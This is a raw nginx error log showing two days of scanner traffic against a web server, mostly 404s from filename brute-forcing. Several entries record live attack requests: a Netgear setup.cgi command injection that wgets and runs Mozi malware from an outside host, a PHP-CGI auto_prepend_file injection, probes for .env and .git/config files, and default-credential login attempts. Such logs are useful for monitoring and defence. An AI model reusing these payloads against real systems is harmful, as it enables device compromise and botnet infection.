2025/02/13 08:25:13 [error] 22#22: *190 open() "/assets/base.shtml" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /base.shtml HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:13 [error] 22#22: *191 open() "/assets/indice.aspx" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /indice.aspx HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:13 [error] 22#22: *192 open() "/assets/menu.pl" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /menu.pl HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:13 [error] 22#22: *193 open() "/assets/base.pl" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /base.pl HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:14 [error] 22#22: *194 open() "/assets/base.php" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /base.php HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:14 [error] 22#22: *195 open() "/assets/index.jsp" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /index.jsp HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:14 [error] 22#22: *196 open() "/assets/default.cgi" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /default.cgi HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:14 [error] 19#19: *197 open() "/assets/admin.jsp" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /admin.jsp HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:14 [error] 19#19: *198 open() "/assets/menu.aspx" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /menu.aspx HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:14 [error] 19#19: *199 open() "/assets/start.php" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /start.php HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:15 [error] 19#19: *200 open() "/assets/home.jsp" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /home.jsp HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:15 [error] 19#19: *201 open() "/assets/localstart.php" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /localstart.php HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:15 [error] 19#19: *202 open() "/assets/inicio.jsa" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /inicio.jsa HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:15 [error] 19#19: *203 open() "/assets/index.asp" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /index.asp HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:15 [error] 19#19: *204 open() "/assets/inicio.aspx" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /inicio.aspx HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:15 [error] 19#19: *205 open() "/assets/main.cgi" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /main.cgi HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:15 [error] 19#19: *206 open() "/assets/indice.cfm" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /indice.cfm HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:16 [error] 19#19: *207 open() "/assets/home.jhtml" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /home.jhtml HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:16 [error] 19#19: *208 open() "/assets/base.inc" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /base.inc HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:16 [error] 19#19: *209 open() "/assets/home.cfm" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /home.cfm HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:16 [error] 19#19: *210 open() "/assets/indice.pl" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /indice.pl HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:16 [error] 19#19: *211 open() "/assets/main.jsp" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /main.jsp HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:16 [error] 20#20: *213 open() "/assets/base.cgi" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /base.cgi HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:17 [error] 20#20: *214 open() "/assets/indice.html" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /indice.html HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:17 [error] 20#20: *215 open() "/assets/admin.shtml" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /admin.shtml HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:17 [error] 20#20: *216 open() "/assets/indice.shtml" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /indice.shtml HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:17 [error] 20#20: *217 open() "/assets/default.jsp" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /default.jsp HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:17 [error] 20#20: *218 open() "/assets/base.html" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /base.html HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:17 [error] 20#20: *219 open() "/assets/indice.jsp" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /indice.jsp HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:17 [error] 20#20: *220 open() "/assets/indice.jsa" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /indice.jsa HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:18 [error] 20#20: *221 open() "/assets/home.cgi" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /home.cgi HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:18 [error] 20#20: *222 open() "/assets/default.shtml" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /default.shtml HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:18 [error] 20#20: *223 open() "/assets/inicio.php" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /inicio.php HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:18 [error] 20#20: *224 open() "/assets/index.aspx" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /index.aspx HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:18 [error] 20#20: *225 open() "/assets/base.aspx" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /base.aspx HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:18 [error] 20#20: *226 open() "/assets/indice.cgi" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /indice.cgi HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:19 [error] 20#20: *227 open() "/assets/index.php" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /index.php HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:19 [error] 20#20: *228 open() "/assets/indice.asp" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /indice.asp HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:19 [error] 21#21: *229 open() "/assets/inicio.cfm" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /inicio.cfm HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:19 [error] 21#21: *230 open() "/assets/start.html" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /start.html HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:19 [error] 21#21: *231 open() "/assets/menu.jsa" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /menu.jsa HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:19 [error] 21#21: *232 open() "/assets/inicio.pl" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /inicio.pl HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:19 [error] 21#21: *233 open() "/assets/menu.cgi" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /menu.cgi HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:20 [error] 21#21: *234 open() "/assets/index.cgi" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /index.cgi HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:20 [error] 21#21: *235 open() "/assets/indice.jhtml" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /indice.jhtml HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:20 [error] 21#21: *236 open() "/assets/start.aspx" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /start.aspx HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:20 [error] 21#21: *237 open() "/assets/inicio.jsp" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /inicio.jsp HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:20 [error] 21#21: *238 open() "/assets/inicio.jhtml" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /inicio.jhtml HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:20 [error] 21#21: *239 open() "/assets/inicio.html" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /inicio.html HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:20 [error] 21#21: *240 open() "/assets/default.asp" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /default.asp HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:21 [error] 21#21: *241 open() "/assets/localstart.jsp" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /localstart.jsp HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:21 [error] 21#21: *242 open() "/assets/index.pl" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /index.pl HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:21 [error] 21#21: *243 open() "/assets/home.jsa" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /home.jsa HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:21 [error] 21#21: *244 open() "/assets/localstart.html" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /localstart.html HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:21 [error] 22#22: *246 open() "/assets/admin.jhtml" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /admin.jhtml HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:21 [error] 22#22: *247 open() "/assets/menu.html" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /menu.html HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:21 [error] 22#22: *248 open() "/assets/main.cfm" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /main.cfm HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:21 [error] 22#22: *249 open() "/assets/localstart.aspx" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /localstart.aspx HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:21 [error] 22#22: *250 open() "/assets/menu.jsp" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /menu.jsp HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:21 [error] 22#22: *251 open() "/assets/start.shtml" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /start.shtml HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:21 [error] 22#22: *252 open() "/assets/start.pl" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /start.pl HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:22 [error] 22#22: *253 open() "/assets/inicio.cgi" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /inicio.cgi HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:22 [error] 22#22: *254 open() "/assets/home.asp" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /home.asp HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:22 [error] 22#22: *255 open() "/assets/main.pl" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /main.pl HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:22 [error] 22#22: *256 open() "/assets/home.shtml" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /home.shtml HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:22 [error] 22#22: *257 open() "/assets/start.cgi" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /start.cgi HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:22 [error] 22#22: *258 open() "/assets/base.cfm" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /base.cfm HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:22 [error] 22#22: *259 open() "/assets/base.asp" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /base.asp HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:22 [error] 22#22: *260 open() "/assets/menu.php" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /menu.php HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:22 [error] 19#19: *261 open() "/assets/main.jsa" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /main.jsa HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:22 [error] 19#19: *262 open() "/assets/base.jsp" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /base.jsp HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:22 [error] 19#19: *263 open() "/assets/admin.asp" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /admin.asp HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:22 [error] 19#19: *264 open() "/assets/menu.asp" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /menu.asp HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:22 [error] 19#19: *265 open() "/assets/default.html" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /default.html HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:23 [error] 19#19: *266 open() "/assets/main.jhtml" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /main.jhtml HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:23 [error] 19#19: *267 open() "/assets/home.html" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /home.html HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:23 [error] 19#19: *268 open() "/assets/index.html" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /index.html HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:23 [error] 19#19: *269 open() "/assets/default.cfm" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /default.cfm HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:23 [error] 19#19: *270 open() "/assets/menu.jhtml" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /menu.jhtml HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:23 [error] 19#19: *271 open() "/assets/inicio.shtml" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /inicio.shtml HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:23 [error] 19#19: *272 open() "/assets/start.jsp" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /start.jsp HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:23 [error] 19#19: *273 open() "/assets/start.jsa" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /start.jsa HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:48:21 [error] 19#19: *276 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 08:54:27 [error] 20#20: *278 open() "/assets/favicon.ico" failed (2: No such file or directory), client: 65.49.1.31, server: , request: "GET /favicon.ico HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 08:54:56 [error] 20#20: *281 "/assets/geoserver/web/index.html" is not found (2: No such file or directory), client: 65.49.1.28, server: , request: "GET /geoserver/web/ HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 09:26:54 [error] 20#20: *285 open() "/assets/logon.htm" failed (2: No such file or directory), client: 46.19.143.26, server: , request: "GET /logon.htm HTTP/1.1", host: "127.0.0.1"
2025/02/13 09:40:42 [error] 20#20: *287 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 10:18:32 [error] 20#20: *290 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 11:48:26 [error] 21#21: *297 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 176.65.128.61, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 12:45:37 [error] 21#21: *304 "/assets/download/powershell/index.html" is not found (2: No such file or directory), client: 162.243.66.204, server: , request: "GET /download/powershell/ HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 12:45:37 [error] 21#21: *305 open() "/assets/get.php" failed (2: No such file or directory), client: 162.243.66.204, server: , request: "GET /get.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 13:51:43 [error] 22#22: *310 "/assets/download/powershell/index.html" is not found (2: No such file or directory), client: 170.64.178.235, server: , request: "GET /download/powershell/ HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 13:51:44 [error] 22#22: *311 open() "/assets/get.php" failed (2: No such file or directory), client: 170.64.178.235, server: , request: "GET /get.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 15:56:58 [error] 22#22: *322 open() "/assets/nmaplowercheck1739462218" failed (2: No such file or directory), client: 104.152.52.34, server: , request: "GET /nmaplowercheck1739462218 HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 15:56:58 [error] 22#22: *323 open() "/assets/sdk" failed (2: No such file or directory), client: 104.152.52.34, server: , request: "POST /sdk HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 15:56:58 [error] 19#19: *325 open() "/assets/evox/about" failed (2: No such file or directory), client: 104.152.52.34, server: , request: "GET /evox/about HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 15:56:58 [error] 19#19: *326 open() "/assets/HNAP1" failed (2: No such file or directory), client: 104.152.52.34, server: , request: "GET /HNAP1 HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 19:02:44 [error] 19#19: *338 open() "/assets/Autodiscover/Autodiscover.xml" failed (2: No such file or directory), client: 92.255.57.58, server: , request: "POST /Autodiscover/Autodiscover.xml HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 19:31:17 [error] 20#20: *341 open() "/assets/actuator/gateway/routes" failed (2: No such file or directory), client: 92.255.57.58, server: , request: "GET /actuator/gateway/routes HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 21:45:03 [error] 20#20: *355 open() "/assets/favicon.ico" failed (2: No such file or directory), client: 104.234.115.53, server: , request: "GET /favicon.ico HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 22:34:52 [error] 21#21: *361 open() "/assets/favicon.ico" failed (2: No such file or directory), client: 118.26.37.95, server: , request: "GET /favicon.ico HTTP/1.1", host: "193.93.76.135:8080", referrer: "http://193.93.76.135:8080"
2025/02/14 00:43:11 [error] 21#21: *372 open() "/assets/nmaplowercheck1739493791" failed (2: No such file or directory), client: 104.152.52.27, server: , request: "GET /nmaplowercheck1739493791 HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/14 00:43:11 [error] 22#22: *373 open() "/assets/sdk" failed (2: No such file or directory), client: 104.152.52.27, server: , request: "POST /sdk HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/14 00:43:11 [error] 22#22: *375 open() "/assets/HNAP1" failed (2: No such file or directory), client: 104.152.52.27, server: , request: "GET /HNAP1 HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/14 00:43:11 [error] 22#22: *376 open() "/assets/evox/about" failed (2: No such file or directory), client: 104.152.52.27, server: , request: "GET /evox/about HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/14 02:34:50 [error] 22#22: *386 open() "/assets/hello.world" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1", host: "193.93.76.135:8080"
2025/02/14 02:34:50 [error] 22#22: *386 directory index of "/assets/" is forbidden, client: 185.93.89.118, server: , request: "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1", host: "193.93.76.135:8080"
2025/02/14 07:32:47 [error] 19#19: *404 open() "/assets/setup.cgi" failed (2: No such file or directory), client: 59.97.255.145, server: , request: "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.97.255.145:50270/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0"
2025/02/14 08:40:45 [error] 20#20: *415 open() "/assets/.env.ci" failed (2: No such file or directory), client: 195.178.110.163, server: , request: "GET /.env.ci HTTP/1.1", host: "193.93.76.135:8080"
2025/02/14 08:40:46 [error] 20#20: *416 open() "/assets/.env.local" failed (2: No such file or directory), client: 195.178.110.163, server: , request: "GET /.env.local HTTP/1.1", host: "193.93.76.135:8080"
2025/02/14 08:40:46 [error] 20#20: *417 open() "/assets/backup/.git/config" failed (2: No such file or directory), client: 195.178.110.163, server: , request: "GET /backup/.git/config HTTP/1.1", host: "193.93.76.135:8080"
2025/02/14 10:03:39 [error] 21#21: *423 "/assets/download/powershell/index.html" is not found (2: No such file or directory), client: 157.245.144.188, server: , request: "GET /download/powershell/ HTTP/1.1", host: "193.93.76.135:8080"
2025/02/14 10:03:39 [error] 21#21: *424 open() "/assets/get.php" failed (2: No such file or directory), client: 157.245.144.188, server: , request: "GET /get.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/14 12:14:34 [error] 21#21: *436 open() "/assets/favicon.ico" failed (2: No such file or directory), client: 185.165.191.27, server: , request: "GET /favicon.ico HTTP/1.1", host: "193.93.76.135:8080"
2025/02/14 12:50:11 [error] 22#22: *441 open() "/assets/boaform/admin/formLogin" failed (2: No such file or directory), client: 45.115.89.211, server: , request: "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0"
2025/02/14 14:02:50 [error] 22#22: *449 "/assets/download/powershell/index.html" is not found (2: No such file or directory), client: 178.62.200.84, server: , request: "GET /download/powershell/ HTTP/1.1", host: "193.93.76.135:8080"
2025/02/14 14:02:50 [error] 22#22: *450 open() "/assets/get.php" failed (2: No such file or directory), client: 178.62.200.84, server: , request: "GET /get.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/14 14:39:30 [error] 19#19: *454 open() "/assets/favicon.ico" failed (2: No such file or directory), client: 65.49.1.112, server: , request: "GET /favicon.ico HTTP/1.1", host: "193.93.76.135:8080"
2025/02/14 14:40:03 [error] 19#19: *457 "/assets/geoserver/web/index.html" is not found (2: No such file or directory), client: 65.49.1.118, server: , request: "GET /geoserver/web/ HTTP/1.1", host: "193.93.76.135:8080"
2025/02/14 14:59:24 [error] 19#19: *460 open() "/assets/favicon.ico" failed (2: No such file or directory), client: 115.231.78.11, server: , request: "GET /favicon.ico HTTP/1.1", host: "193.93.76.135:8080"
2025/02/14 14:59:24 [error] 19#19: *461 open() "/assets/robots.txt" failed (2: No such file or directory), client: 115.231.78.11, server: , request: "GET /robots.txt HTTP/1.1", host: "193.93.76.135:8080"
2025/02/14 16:02:03 [error] 19#19: *465 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/14 17:16:11 [error] 20#20: *472 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/14 17:56:26 [error] 20#20: *477 open() "/assets/favicon.ico" failed (2: No such file or directory), client: 206.168.34.57, server: , request: "GET /favicon.ico HTTP/1.1", host: "193.93.76.135:8080"
2025/02/14 18:05:04 [error] 20#20: *479 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/14 18:44:48 [error] 20#20: *482 open() "/assets/boaform/admin/formLogin" failed (2: No such file or directory), client: 59.93.90.142, server: , request: "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0"
